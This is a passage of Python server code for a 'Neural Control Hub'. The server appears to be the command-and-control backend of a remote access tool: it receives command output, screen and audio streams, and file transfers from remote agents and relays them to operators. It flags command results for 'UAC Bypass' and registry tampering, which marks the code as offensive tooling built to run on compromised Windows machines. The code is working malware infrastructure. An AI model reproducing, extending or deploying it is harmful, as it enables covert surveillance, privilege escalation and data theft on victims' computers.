            'codecs': WEBRTC_CONFIG.get('codecs', {}),
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

def _get_viewer_token():
    try:
        token = session.get('webrtc_viewer_id')
    except Exception:
        token = None
    if not token:
        token = secrets.token_hex(16)
        session['webrtc_viewer_id'] = token
    return token

@app.route('/api/webrtc/viewer/connect', methods=['POST'])
def http_webrtc_viewer_connect():
    if not WEBRTC_AVAILABLE:
        return jsonify({'success': False, 'error': 'WebRTC not available'}), 400
    data = request.get_json(silent=True) or {}
    agent_id = data.get('agent_id')
    if not agent_id or agent_id not in WEBRTC_STREAMS:
        return jsonify({'success': False, 'error': 'Agent not available for WebRTC'}), 400
    try:
        viewer_token = _get_viewer_token()
        viewer_pc = RTCPeerConnection()
        for ice_server in WEBRTC_CONFIG['ice_servers']:
            viewer_pc.addIceServer(ice_server)
        WEBRTC_VIEWERS[viewer_token] = {
            'agent_id': agent_id,
            'pc': viewer_pc,
            'streams': {}
        }
        agent_streams = WEBRTC_STREAMS.get(agent_id, {})
        for track_kind, tracks in agent_streams.items():
            try:
                if isinstance(tracks, list):
                    for t in tracks:
                        sender = viewer_pc.addTrack(t)
                        if track_kind not in WEBRTC_VIEWERS[viewer_token]['streams']:
                            WEBRTC_VIEWERS[viewer_token]['streams'][track_kind] = []
                        WEBRTC_VIEWERS[viewer_token]['streams'][track_kind].append(sender)
                else:
                    sender = viewer_pc.addTrack(tracks)
                    WEBRTC_VIEWERS[viewer_token]['streams'][track_kind] = [sender]
            except Exception:
                pass
        try:
            loop = asyncio.get_event_loop()
            future = asyncio.run_coroutine_threadsafe(viewer_pc.createOffer(), loop)
            offer = future.result(timeout=5)
            try:
                asyncio.run_coroutine_threadsafe(viewer_pc.setLocalDescription(offer), loop)
            except RuntimeError:
                async def set_local_desc():
                    await viewer_pc.setLocalDescription(offer)
                asyncio.run(set_local_desc())
            return jsonify({'success': True, 'offer': offer.sdp, 'type': offer.type})
        except RuntimeError:
            async def create_offer_async():
                offer = await viewer_pc.createOffer()
                await viewer_pc.setLocalDescription(offer)
                return offer
            offer = asyncio.run(create_offer_async())
            return jsonify({'success': True, 'offer': offer.sdp, 'type': offer.type})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/webrtc/viewer/answer', methods=['POST'])
def http_webrtc_viewer_answer():
    data = request.get_json(silent=True) or {}
    answer_sdp = data.get('answer')
    token = session.get('webrtc_viewer_id')
    if not answer_sdp or not token or token not in WEBRTC_VIEWERS:
        return jsonify({'success': False, 'error': 'Invalid viewer session'}), 400
    try:
        viewer_pc = WEBRTC_VIEWERS[token]['pc']
        answer = RTCSessionDescription(sdp=answer_sdp, type='answer')
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.setRemoteDescription(answer), loop)
        except RuntimeError:
            async def set_remote_desc():
                await viewer_pc.setRemoteDescription(answer)
            asyncio.run(set_remote_desc())
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/webrtc/viewer/ice', methods=['POST'])
def http_webrtc_viewer_ice():
    data = request.get_json(silent=True) or {}
    candidate = data.get('candidate')
    token = session.get('webrtc_viewer_id')
    if not candidate or not token or token not in WEBRTC_VIEWERS:
        return jsonify({'success': False, 'error': 'Invalid viewer session'}), 400
    try:
        viewer_pc = WEBRTC_VIEWERS[token]['pc']
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.addIceCandidate(candidate), loop)
        except RuntimeError:
            async def add_ice():
                await viewer_pc.addIceCandidate(candidate)
            asyncio.run(add_ice())
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/webrtc/viewer/disconnect', methods=['POST'])
def http_webrtc_viewer_disconnect():
    token = session.get('webrtc_viewer_id')
    if not token or token not in WEBRTC_VIEWERS:
        return jsonify({'success': True})
    try:
        viewer_pc = WEBRTC_VIEWERS[token]['pc']
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(viewer_pc.close(), loop)
        except RuntimeError:
            async def close_viewer():
                await viewer_pc.close()
            asyncio.run(close_viewer())
    except Exception:
        pass
    try:
        del WEBRTC_VIEWERS[token]
    except Exception:
        pass
    return jsonify({'success': True})

# Additional WebSocket events for real-time updates

@socketio.on('performance_update')
def handle_performance_update(data):
    """Handle performance metrics updates from agents"""
    agent_id = data.get('agent_id')
    if agent_id and agent_id in AGENTS_DATA:
        AGENTS_DATA[agent_id]["cpu_usage"] = data.get('cpu_usage', 0)
        AGENTS_DATA[agent_id]["memory_usage"] = data.get('memory_usage', 0)
        AGENTS_DATA[agent_id]["network_usage"] = data.get('network_usage', 0)
        AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
        
        # Broadcast performance update to operators
        emit('agent_performance_update', {
            'agent_id': agent_id,
            'performance': {
                'cpu': data.get('cpu_usage', 0),
                'memory': data.get('memory_usage', 0),
                'network': data.get('network_usage', 0)
            }
        }, room='operators', broadcast=True)

@socketio.on('command_result')
def handle_command_result(data):
    """Handle command execution results from agents"""
    print(f"🔍 Controller: Command result received: {data}")
    print(f"🔍 Controller: Received from SID: {request.sid}")
    print(f"🔍 Controller: Current agents: {list(AGENTS_DATA.keys())}")
    
    agent_id = data.get('agent_id')
    execution_id = data.get('execution_id')
    command = data.get('command')
    output = data.get('output', '')
    success = data.get('success', False)
    execution_time = data.get('execution_time', 0)
    
    print(f"🔍 Controller: Processing command result for agent {agent_id}")
    print(f"🔍 Controller: Command: {command}")
    try:
        if isinstance(output, (bytes, bytearray)):
            safe_output = output.decode('utf-8', errors='replace')
        elif isinstance(output, str):
            safe_output = output
        elif output is None:
            safe_output = ''
        else:
            safe_output = str(output)
        print(f"🔍 Controller: Output length: {len(safe_output)}")
    except Exception as e:
        print(f"🔍 Controller: Output length calc error: {e}")
        safe_output = '' if output is None else str(output)
    print(f"🔍 Controller: Agent exists in AGENTS_DATA: {agent_id in AGENTS_DATA}")
    
    # Broadcast command result to operators
    result_data = {
        'agent_id': agent_id,
        'execution_id': execution_id,
        'command': command,
        'output': safe_output,
        'formatted_text': data.get('formatted_text'),
        'prompt': data.get('prompt'),
        'terminal_type': data.get('terminal_type'),
        'ps_version': data.get('ps_version'),
        'exit_code': data.get('exit_code'),
        'success': success,
        'execution_time': execution_time,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }
    try:
        db = get_db()
        history = DbCommandHistory(
            agent_id=agent_id,
            command=str(command or ''),
            output=str(safe_output or ''),
            timestamp=datetime.datetime.utcnow(),
            success=bool(success)
        )
        db.add(history)
        db.commit()
        db.close()
    except Exception:
        pass
    
    print(f"🔍 Controller: Broadcasting to operators room: {result_data}")
    emit('command_result', result_data, room='operators', broadcast=True)
    print(f"🔍 Controller: Command result broadcasted successfully")
    
    # Log activity
    if agent_id in AGENTS_DATA:
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'command',
            'action': 'Command Executed',
            'details': f'Command "{command}" {"completed" if success else "failed"}',
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success' if success else 'error'
        }, room='operators', broadcast=True)
        try:
            email_cfg = load_settings().get('email', {})
            if email_cfg.get('enabled') and email_cfg.get('notifyCommandFailure') and not success:
                send_email_notification(
                    "Command Failure",
                    f'Agent {AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}")} ({agent_id}) command "{command}" failed. Output: {safe_output[:500]}'
                )
        except Exception:
            pass
        try:
            cmd = (command or '')
            lc = cmd.lower()
            notif_type = 'success' if success else 'error'
            if ('uac' in lc) or ('bypass' in lc):
                emit('agent_notification', {
                    'id': f'notif_{int(time.time())}_{secrets.token_hex(3)}',
                    'type': notif_type,
                    'title': 'UAC Bypass',
                    'message': f'{cmd} {"succeeded" if success else "failed"}',
                    'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
                    'agent_id': agent_id,
                    'read': False,
                    'category': 'security'
                }, room='operators', broadcast=True)
            elif ('registry' in lc) or ('reg ' in lc) or ('policy' in lc):
                emit('agent_notification', {
                    'id': f'notif_{int(time.time())}_{secrets.token_hex(3)}',
                    'type': notif_type,
                    'title': 'Registry Control',
                    'message': f'{cmd} {"succeeded" if success else "failed"}',
                    'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
                    'agent_id': agent_id,
                    'read': False,
                    'category': 'security'
                }, room='operators', broadcast=True)
        except Exception:
            pass

@socketio.on('stream_status')
def handle_stream_status(data):
    """Handle stream status updates from agents"""
    agent_id = data.get('agent_id')
    stream_type = data.get('type')
    status = data.get('status')  # 'started', 'stopped', 'error'
    quality = data.get('quality', 'unknown')
    
    # Broadcast stream status to operators
    emit('stream_status_update', {
        'agent_id': agent_id,
        'stream_type': stream_type,
        'status': status,
        'quality': quality,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }, room='operators', broadcast=True)
    
    # Log activity
    if agent_id in AGENTS_DATA:
        action = f'{stream_type.title()} Stream {"Started" if status == "started" else "Stopped" if status == "stopped" else "Error"}'
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'stream',
            'action': action,
            'details': f'{stream_type.title()} stream {status} on agent {agent_id}',
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success' if status in ['started', 'stopped'] else 'error'
        }, room='operators', broadcast=True)

@socketio.on('file_operation_result')
def handle_file_operation_result(data):
    """Handle file operation results from agents"""
    agent_id = data.get('agent_id')
    operation = data.get('operation')  # 'download', 'upload', 'delete'
    file_path = data.get('file_path')
    success = data.get('success', False)
    error_message = data.get('error_message', '')
    file_size = data.get('file_size', 0)
    
    # Broadcast file operation result to operators
    emit('file_operation_result', {
        'agent_id': agent_id,
        'operation': operation,
        'file_path': file_path,
        'success': success,
        'error_message': error_message,
        'file_size': file_size,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }, room='operators', broadcast=True)
    
    # Log activity
    if agent_id in AGENTS_DATA:
        action = f'File {operation.title()}'
        details = f'{"Successfully" if success else "Failed to"} {operation} {file_path}'
        if not success and error_message:
            details += f' - {error_message}'
        
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'file',
            'action': action,
            'details': details,
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success' if success else 'error'
    }, room='operators', broadcast=True)

@socketio.on('system_alert')
def handle_system_alert(data):
    """Handle system alerts from agents"""
    agent_id = data.get('agent_id')
    alert_type = data.get('type')  # 'warning', 'error', 'critical'
    message = data.get('message')
    details = data.get('details', '')
    
    # Broadcast system alert to operators
    emit('system_alert', {
        'agent_id': agent_id,
        'type': alert_type,
        'message': message,
        'details': details,
        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
    }, room='operators', broadcast=True)
    
    # Log activity
    if agent_id in AGENTS_DATA:
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'security' if alert_type == 'critical' else 'system',
            'action': f'System {alert_type.title()}',
            'details': message,
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'error' if alert_type in ['error', 'critical'] else 'warning'
        }, room='operators', broadcast=True)

@socketio.on('agent_notification')
def handle_agent_notification(data):
    emit('agent_notification', data, room='operators', broadcast=True)

@socketio.on('heartbeat')
def handle_heartbeat(data):
    """Handle heartbeat from agents to keep them alive"""
    agent_id = (data or {}).get('agent_id')
    if not agent_id:
        return
    if agent_id not in AGENTS_DATA:
        AGENTS_DATA[agent_id] = {}
    prev_sid = AGENTS_DATA[agent_id].get('sid')
    AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
    AGENTS_DATA[agent_id]["sid"] = request.sid
    # Update performance metrics if provided
    if 'performance' in data:
        perf = data['performance']
        AGENTS_DATA[agent_id]["cpu_usage"] = perf.get('cpu', 0)
        AGENTS_DATA[agent_id]["memory_usage"] = perf.get('memory', 0)
        AGENTS_DATA[agent_id]["network_usage"] = perf.get('network', 0)
    if prev_sid != request.sid:
        emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)

    # Acknowledge heartbeat
    emit('heartbeat_ack', {'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'})

# Background task to check for disconnected agents
def cleanup_disconnected_agents():
    """Background task to clean up agents that haven't sent heartbeat"""
    import threading
    
    def cleanup():
        while True:
            try:
                current_time = datetime.datetime.utcnow()
                timeout_threshold = 300  # 5 minutes
                
                disconnected_agents = []
                for agent_id, data in list(AGENTS_DATA.items()):
                    if data.get('last_seen'):
                        try:
                            last_seen = datetime.datetime.fromisoformat(data['last_seen'].replace('Z', '+00:00'))
                            if last_seen.tzinfo is None:
                                last_seen = last_seen.replace(tzinfo=datetime.timezone.utc)
                            
                            if (current_time.replace(tzinfo=datetime.timezone.utc) - last_seen).total_seconds() > timeout_threshold:
                                disconnected_agents.append(agent_id)
                        except Exception as e:
                            print(f"Error parsing last_seen for agent {agent_id}: {e}")
                            disconnected_agents.append(agent_id)
                
                # Clean up disconnected agents
                for agent_id in disconnected_agents:
                    agent_name = AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}")
                    del AGENTS_DATA[agent_id]
                    
                    # Notify operators
                    socketio.emit('agent_list_update', _agents_payload(), room='operators')
                    socketio.emit('activity_update', {
                        'id': f'act_{int(time.time())}',
                        'type': 'connection',
                        'action': 'Agent Timeout',
                        'details': f'Agent {agent_id} timed out (no heartbeat)',
                        'agent_id': agent_id,
                        'agent_name': agent_name,
                        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
                        'status': 'warning'
                    }, room='operators')
                    
                    print(f"Agent {agent_id} timed out and was removed")
                
                time.sleep(60)  # Check every minute
            except Exception as e:
                print(f"Error in cleanup task: {e}")
                time.sleep(60)
    
    cleanup_thread = threading.Thread(target=cleanup, daemon=True)
    cleanup_thread.start()

# Start the cleanup task
cleanup_disconnected_agents()

if __name__ == "__main__":
    print("Starting Neural Control Hub with Socket.IO + WebRTC support...")
    print(f"Server will be available at: http://{Config.HOST}:{Config.PORT}")
    print(f"Session timeout: {Config.SESSION_TIMEOUT} seconds")
    print(f"Max login attempts: {Config.MAX_LOGIN_ATTEMPTS}")
    print(f"Password security: PBKDF2-SHA256 with {Config.HASH_ITERATIONS:,} iterations")
    print(f"Salt length: {Config.SALT_LENGTH} bytes")
    print(f"WebRTC support: {'Enabled' if WEBRTC_AVAILABLE else 'Disabled (aiortc not available)'}")
    if WEBRTC_AVAILABLE:
        print(f"WebRTC codecs: Video={', '.join(WEBRTC_CONFIG['codecs']['video'])}, Audio={', '.join(WEBRTC_CONFIG['codecs']['audio'])}")
        print(f"WebRTC features: Simulcast={WEBRTC_CONFIG['simulcast']}, SVC={WEBRTC_CONFIG['svc']}")
        print(f"Performance tuning: Bandwidth estimation, Adaptive bitrate, Frame dropping")
        print(f"Production scale: Current={PRODUCTION_SCALE['current_implementation']}, Target={PRODUCTION_SCALE['target_implementation']}")
        print(f"Scalability limits: aiortc={PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']}, mediasoup={PRODUCTION_SCALE['scalability_limits']['mediasoup_max_viewers']}")
    try:
        import os as _os
        _port = int(_os.environ.get("PORT", Config.PORT))
    except Exception:
        _port = Config.PORT
    socketio.run(app, host="0.0.0.0", port=_port, debug=False)
